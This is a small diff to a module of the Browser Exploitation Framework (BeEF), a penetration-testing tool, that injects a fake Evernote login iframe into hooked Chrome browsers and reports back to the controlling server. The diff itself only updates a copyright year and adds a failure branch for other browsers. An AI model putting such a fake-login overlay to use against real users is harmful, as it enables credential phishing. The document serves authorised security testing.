@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -24,7 +24,9 @@ beef.execute(function() {
 	if (beef.browser.isC()) {
 		beef.dom.createIframe('custom', {'src':beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/ev/login.html','id':'EVIFRAME'}, {'width':'317px','height':'336px','position':'fixed','right':'0px','top':'0px','z-index':beef.dom.getHighestZindex()+1,'border':'0px','overflow':'hidden'}); 
 		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');	
-	} 
-
+	} else {
+		beef.debug('[Fake Evernote Clipper] Unspported browser');
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=No IFrame Created -- browser is not Chrome', beef.are.status_error());
+	}
 
 });
